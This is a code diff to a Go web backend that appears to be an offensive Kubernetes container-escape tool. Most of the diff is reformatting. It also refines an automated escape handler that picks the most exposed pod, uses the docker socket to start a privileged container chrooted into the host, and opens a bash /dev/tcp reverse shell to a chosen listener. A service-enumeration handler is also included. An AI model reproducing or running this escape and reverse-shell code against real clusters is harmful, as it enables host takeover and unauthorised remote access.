@@ -996,31 +996,36 @@ func countWhere(items []escapeRiskItem, pred func(escapeRiskItem) bool) int {
 	return n
 }
 
-
 // ==================== CDK Auto-Evaluate: 在Pod内运行全量环境检测 ====================
 
 type evaluatePodRequest struct {
-	TargetHost    string `json:"target_host" binding:"required"`
-	Namespace     string `json:"namespace"`
-	PodName       string `json:"pod_name" binding:"required"`
-	Token         string `json:"token"`
-	Username      string `json:"username"`
-	Password      string `json:"password"`
-	TimeoutSec    int    `json:"timeout_sec"`
-	SkipTLS       bool   `json:"skip_tls"`
+	TargetHost string `json:"target_host" binding:"required"`
+	Namespace  string `json:"namespace"`
+	PodName    string `json:"pod_name" binding:"required"`
+	Token      string `json:"token"`
+	Username   string `json:"username"`
+	Password   string `json:"password"`
+	TimeoutSec int    `json:"timeout_sec"`
+	SkipTLS    bool   `json:"skip_tls"`
 }
 
 func (h *CDKHandler) EvaluatePod(c *gin.Context) {
 	var req evaluatePodRequest
 	if err := c.ShouldBindJSON(&req); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()}); return
+		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		return
 	}
-	if req.Namespace == "" { req.Namespace = "default" }
-	if req.TimeoutSec == 0 { req.TimeoutSec = 30 }
+	if req.Namespace == "" {
+		req.Namespace = "default"
+	}
+	if req.TimeoutSec == 0 {
+		req.TimeoutSec = 30
+	}
 
 	client, err := kubectl.NewTargetClient(req.TargetHost, req.Token, req.Username, req.Password, req.SkipTLS)
 	if err != nil {
-		c.JSON(http.StatusOK, gin.H{"error": err.Error()}); return
+		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
+		return
 	}
 
 	ctx, cancel := context.WithTimeout(c.Request.Context(), time.Duration(req.TimeoutSec)*time.Second)
@@ -1067,11 +1072,15 @@ echo "=== CDK EVALUATE END ==="
 	}
 
 	output := result.Stdout
-	if result.Stderr != "" { output += "\n" + result.Stderr }
+	if result.Stderr != "" {
+		output += "\n" + result.Stderr
+	}
 	lines := strings.Split(output, "\n")
 	for _, line := range lines {
 		line = strings.TrimSpace(line)
-		if !strings.HasPrefix(line, "{") { continue }
+		if !strings.HasPrefix(line, "{") {
+			continue
+		}
 		var check map[string]interface{}
 		if json.Unmarshal([]byte(line), &check) == nil {
 			checks = append(checks, gin.H{"check": check["check"], "result": check["result"]})
@@ -1099,51 +1108,82 @@ func evaluatePodSummary(checks []gin.H) gin.H {
 			risks = append(risks, "HIGH: host devices accessible - disk mount escape possible")
 		case checkName == "host_mounts" && result != "" && result != " ":
 			risks = append(risks, "HIGH: host filesystem mounts detected")
-		case checkName == "seccomp_0_means_disabled" && strings.Contains(result, "0"):
+		case checkName == "seccomp" && strings.Contains(result, "0"):
 			risks = append(risks, "MEDIUM: seccomp=0 (likely privileged container)")
 		case checkName == "sensitive_files" && result != "" && result != " ":
-			risks = append(risks, "INFO: sensitive files found: " + result)
+			risks = append(risks, "INFO: sensitive files found: "+result)
 		case checkName == "sa_token" && !strings.Contains(result, "not_mounted"):
 			risks = append(risks, "INFO: SA token mounted - can authenticate to K8s API")
 		}
 	}
-	if len(risks) > 0 {
-		s["risk_level"] = "high"
-		if strings.Contains(strings.Join(risks, ""), "CRITICAL") {
-			s["risk_level"] = "critical"
-		}
-	}
+	s["risk_level"] = highestRiskLevel(risks)
 	s["risks"] = risks
 	s["total_risks"] = len(risks)
 	return s
 }
 
+func highestRiskLevel(risks []string) string {
+	level := "low"
+	for _, risk := range risks {
+		upper := strings.ToUpper(strings.TrimSpace(risk))
+		switch {
+		case strings.HasPrefix(upper, "CRITICAL"):
+			return "critical"
+		case strings.HasPrefix(upper, "HIGH"):
+			level = "high"
+		case strings.HasPrefix(upper, "MEDIUM") && level != "high":
+			level = "medium"
+		case strings.HasPrefix(upper, "INFO") && level == "low":
+			level = "info"
+		}
+	}
+	return level
+}
+
 // ==================== CDK Auto-Escape: 自动选择最优逃逸路径并执行 ====================
 
+func autoEscapeHostCommand(lhost, lport string) string {
+	base := "echo ESCAPED_TO_HOST; id; hostname"
+	host := strings.TrimSpace(lhost)
+	if host == "" {
+		return base
+	}
+	port := strings.TrimSpace(lport)
+	if port == "" {
+		port = "4444"
+	}
+	return fmt.Sprintf("%s; (bash -i >& /dev/tcp/%s/%s 0>&1) >/dev/null 2>&1 &", base, host, port)
+}
+
 type autoEscapeRequest struct {
-	TargetHost  string `json:"target_host" binding:"required"`
-	Token       string `json:"token"`
-	Username    string `json:"username"`
-	Password    string `json:"password"`
-	SkipTLS     bool   `json:"skip_tls"`
-	TimeoutSec  int    `json:"timeout_sec"`
-	LHOST       string `json:"lhost"`
-	LPORT       string `json:"lport"`
-	DryRun      bool   `json:"dry_run"`
+	TargetHost string `json:"target_host" binding:"required"`
+	Token      string `json:"token"`
+	Username   string `json:"username"`
+	Password   string `json:"password"`
+	SkipTLS    bool   `json:"skip_tls"`
+	TimeoutSec int    `json:"timeout_sec"`
+	LHOST      string `json:"lhost"`
+	LPORT      string `json:"lport"`
+	DryRun     bool   `json:"dry_run"`
 }
 
 func (h *CDKHandler) AutoEscape(c *gin.Context) {
 	var req autoEscapeRequest
 	if err := c.ShouldBindJSON(&req); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()}); return
+		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		return
 	}
-	if req.TimeoutSec == 0 { req.TimeoutSec = 60 }
-	if req.LHOST == "" { req.LHOST = "attacker-ip" }
-	if req.LPORT == "" { req.LPORT = "4444" }
+	if req.TimeoutSec == 0 {
+		req.TimeoutSec = 60
+	}
+	if req.LPORT == "" {
+		req.LPORT = "4444"
+	}
 
 	client, err := kubectl.NewTargetClient(req.TargetHost, req.Token, req.Username, req.Password, req.SkipTLS)
 	if err != nil {
-		c.JSON(http.StatusOK, gin.H{"error": err.Error()}); return
+		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
+		return
 	}
 
 	ctx, cancel := context.WithTimeout(c.Request.Context(), time.Duration(req.TimeoutSec)*time.Second)
@@ -1152,10 +1192,13 @@ func (h *CDKHandler) AutoEscape(c *gin.Context) {
 	steps := []gin.H{}
 	escaped := false
 	evidence := ""
+	hostFSMounted := false
+	hostContainerCreated := false
 
 	pods, err := client.ListPods(ctx, "")
 	if err != nil {
-		c.JSON(http.StatusOK, gin.H{"error": "list pods failed: " + err.Error()}); return
+		c.JSON(http.StatusOK, gin.H{"error": "list pods failed: " + err.Error()})
+		return
 	}
 	steps = append(steps, gin.H{"step": 1, "action": "list_pods", "result": fmt.Sprintf("found %d pods", len(pods.Items))})
 
@@ -1171,27 +1214,43 @@ func (h *CDKHandler) AutoEscape(c *gin.Context) {
 		reasons := []string{}
 		for _, c := range pod.Spec.Containers {
 			if c.SecurityContext != nil && c.SecurityContext.Privileged != nil && *c.SecurityContext.Privileged {
-				score += 100; reasons = append(reasons, "privileged")
+				score += 100
+				reasons = append(reasons, "privileged")
 			}
 		}
 		for _, v := range pod.Spec.Volumes {
 			if v.HostPath != nil {
-				score += 70; reasons = append(reasons, "hostPath:"+v.HostPath.Path)
+				score += 70
+				reasons = append(reasons, "hostPath:"+v.HostPath.Path)
 			}
 		}
-		if pod.Spec.HostPID { score += 60; reasons = append(reasons, "hostPID") }
-		if pod.Spec.HostNetwork { score += 50; reasons = append(reasons, "hostNetwork") }
+		if pod.Spec.HostPID {
+			score += 60
+			reasons = append(reasons, "hostPID")
+		}
+		if pod.Spec.HostNetwork {
+			score += 50
+			reasons = append(reasons, "hostNetwork")
+		}
 		for _, c := range pod.Spec.Containers {
 			if c.SecurityContext != nil {
 				for _, cap := range c.SecurityContext.Capabilities.Add {
-					if string(cap) == "SYS_ADMIN" { score += 80; reasons = append(reasons, "CAP_SYS_ADMIN") }
+					if string(cap) == "SYS_ADMIN" {
+						score += 80
+						reasons = append(reasons, "CAP_SYS_ADMIN")
+					}
 				}
 			}
 			for _, vm := range c.VolumeMounts {
-				if strings.Contains(vm.MountPath, "docker.sock") { score += 90; reasons = append(reasons, "docker.sock") }
+				if strings.Contains(vm.MountPath, "docker.sock") {
+					score += 90
+					reasons = append(reasons, "docker.sock")
+				}
 			}
 		}
-		if score > 0 { candidates = append(candidates, candidate{pod: pod, score: score, reasons: reasons}) }
+		if score > 0 {
+			candidates = append(candidates, candidate{pod: pod, score: score, reasons: reasons})
+		}
 	}
 	sort.Slice(candidates, func(i, j int) bool { return candidates[i].score > candidates[j].score })
 
@@ -1218,7 +1277,8 @@ func (h *CDKHandler) AutoEscape(c *gin.Context) {
 	var escapeCmd string
 	if containsStr(target.reasons, "docker.sock") {
 		method = "docker_sock_api"
-		escapeCmd = fmt.Sprintf("docker -H unix:///var/run/docker.sock run -d --privileged --pid=host --net=host -v /:/host alpine:3.20 sh -c 'chroot /host sh -c \"bash -i >& /dev/tcp/%s/%s 0>&1 &\"' 2>&1 || echo DOCKER_ESCAPE_FAILED", req.LHOST, req.LPORT)
+		hostCmd := shellQuoteSingle(autoEscapeHostCommand(req.LHOST, req.LPORT))
+		escapeCmd = fmt.Sprintf(`docker -H unix:///var/run/docker.sock run --rm --privileged --pid=host --net=host -v /:/host alpine:3.20 sh -c "chroot /host /bin/sh -c %s" 2>&1 && echo DOCKER_CONTAINER_CREATED || echo DOCKER_ESCAPE_FAILED`, hostCmd)
 	} else if containsStr(target.reasons, "privileged") {
 		method = "chroot_or_cgroup"
 		escapeCmd = fmt.Sprintf(
@@ -1233,20 +1293,50 @@ func (h *CDKHandler) AutoEscape(c *gin.Context) {
 	out := ""
 	if execErr != nil {
 		out = "exec error: " + execErr.Error()
-		if escResult != nil { out += "\nstdout: " + escResult.Stdout + "\nstderr: " + escResult.Stderr }
+		if escResult != nil {
+			out += "\nstdout: " + escResult.Stdout + "\nstderr: " + escResult.Stderr
+		}
 	} else {
 		out = escResult.Stdout
-		if escResult.Stderr != "" { out += "\n" + escResult.Stderr }
+		if escResult.Stderr != "" {
+			out += "\n" + escResult.Stderr
+		}
 	}
 
-	if strings.Contains(out, "ESCAPED_TO_HOST") || strings.Contains(out, "MOUNT_OK") {
-		escaped = true; evidence = out
+	if strings.Contains(out, "ESCAPED_TO_HOST") {
+		escaped = true
+		evidence = out
 	}
+	hostFSMounted = strings.Contains(out, "MOUNT_OK")
+	hostContainerCreated = strings.Contains(out, "DOCKER_CONTAINER_CREATED")
 	preview := out
-	if len(preview) > 500 { preview = preview[:500] + "..." }
-	steps = append(steps, gin.H{"step": 3, "action": "execute", "method": method, "escaped": escaped, "output": preview})
+	if len(preview) > 500 {
+		preview = preview[:500] + "..."
+	}
+	step := gin.H{"step": 3, "action": "execute", "method": method, "escaped": escaped, "output": preview}
+	if hostFSMounted {
+		step["host_fs_mounted"] = true
+	}
+	if hostContainerCreated {
+		step["host_container_created"] = true
+	}
+	steps = append(steps, step)
 
-	c.JSON(http.StatusOK, gin.H{"escaped": escaped, "steps": steps, "pod_used": target.pod.Namespace + "/" + target.pod.Name, "evidence": evidence})
+	resp := gin.H{
+		"escaped":                escaped,
+		"steps":                  steps,
+		"pod_used":               target.pod.Namespace + "/" + target.pod.Name,
+		"evidence":               evidence,
+		"host_fs_mounted":        hostFSMounted,
+		"host_container_created": hostContainerCreated,
+	}
+	if hostFSMounted && !escaped {
+		resp["note"] = "宿主机文件系统已挂载，但还没有看到明确的宿主机 shell / chroot 成功证据。"
+	}
+	if hostContainerCreated && !escaped {
+		resp["note"] = "已通过 docker.sock 创建宿主机侧特权容器，但当前返回还没有直接宿主机 shell 证据。"
+	}
+	c.JSON(http.StatusOK, resp)
 }
 
 // ==================== CDK Internal Services Scan ====================
@@ -1263,13 +1353,17 @@ type servicesScanRequest struct {
 func (h *CDKHandler) ServicesScan(c *gin.Context) {
 	var req servicesScanRequest
 	if err := c.ShouldBindJSON(&req); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()}); return
+		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		return
 	}
-	if req.TimeoutSec == 0 { req.TimeoutSec = 15 }
+	if req.TimeoutSec == 0 {
+		req.TimeoutSec = 15
+	}
 
 	client, err := kubectl.NewTargetClient(req.TargetHost, req.Token, req.Username, req.Password, req.SkipTLS)
 	if err != nil {
-		c.JSON(http.StatusOK, gin.H{"error": err.Error()}); return
+		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
+		return
 	}
 
 	ctx, cancel := context.WithTimeout(c.Request.Context(), time.Duration(req.TimeoutSec)*time.Second)
@@ -1280,23 +1374,30 @@ func (h *CDKHandler) ServicesScan(c *gin.Context) {
 	if err == nil {
 		for _, svc := range svcList.Items {
 			ports := []string{}
-			for _, p := range svc.Spec.Ports { ports = append(ports, fmt.Sprintf("%d/%s", p.Port, p.Protocol)) }
-			category := "other"; risk := "info"
+			for _, p := range svc.Spec.Ports {
+				ports = append(ports, fmt.Sprintf("%d/%s", p.Port, p.Protocol))
+			}
+			category := "other"
+			risk := "info"
 			switch {
 			case strings.Contains(svc.Name, "kube-dns") || strings.Contains(svc.Name, "coredns"):
-				category = "dns"; risk = "medium"
+				category = "dns"
+				risk = "medium"
 			case strings.Contains(svc.Name, "kubernetes-dashboard") || strings.Contains(svc.Name, "dashboard"):
-				category = "dashboard"; risk = "high"
+				category = "dashboard"
+				risk = "high"
 			case strings.Contains(svc.Name, "metrics-server"):
 				category = "monitoring"
 			case strings.Contains(svc.Name, "prometheus") || strings.Contains(svc.Name, "grafana"):
-				category = "monitoring"; risk = "medium"
+				category = "monitoring"
+				risk = "medium"
 			case strings.Contains(svc.Name, "istio") || strings.Contains(svc.Name, "envoy"):
 				category = "service-mesh"
 			case strings.Contains(svc.Name, "nginx-ingress") || strings.Contains(svc.Name, "traefik"):
 				category = "ingress"
 			case strings.Contains(svc.Name, "etcd"):
-				category = "etcd"; risk = "critical"
+				category = "etcd"
+				risk = "critical"
 			}
 			services = append(services, gin.H{"namespace": svc.Namespace, "name": svc.Name, "type": string(svc.Spec.Type), "cluster_ip": svc.Spec.ClusterIP, "ports": ports, "category": category, "risk": risk})
 		}
@@ -1308,16 +1409,25 @@ func (h *CDKHandler) ServicesScan(c *gin.Context) {
 		for _, ep := range epList.Items {
 			addrs := []string{}
 			for _, subset := range ep.Subsets {
-				for _, addr := range subset.Addresses { addrs = append(addrs, addr.IP) }
+				for _, addr := range subset.Addresses {
+					addrs = append(addrs, addr.IP)
+				}
 			}
-			if len(addrs) > 0 { endpoints = append(endpoints, gin.H{"name": ep.Namespace + "/" + ep.Name, "ips": addrs}) }
+			if len(addrs) > 0 {
+				endpoints = append(endpoints, gin.H{"namespace": ep.Namespace, "name": ep.Name, "ips": addrs})
+			}
 		}
 	}
 
-	cats := map[string]int{}; highRisk := 0; notable := []gin.H{}
+	cats := map[string]int{}
+	highRisk := 0
+	notable := []gin.H{}
 	for _, svc := range services {
 		cats[svc["category"].(string)] = cats[svc["category"].(string)] + 1
-		if svc["risk"] == "high" || svc["risk"] == "critical" { highRisk++; notable = append(notable, svc) }
+		if svc["risk"] == "high" || svc["risk"] == "critical" {
+			highRisk++
+			notable = append(notable, svc)
+		}
 	}
 
 	c.JSON(http.StatusOK, gin.H{"services": services, "endpoints": endpoints, "total": len(services), "categories": cats, "high_risk": highRisk, "notable": notable})
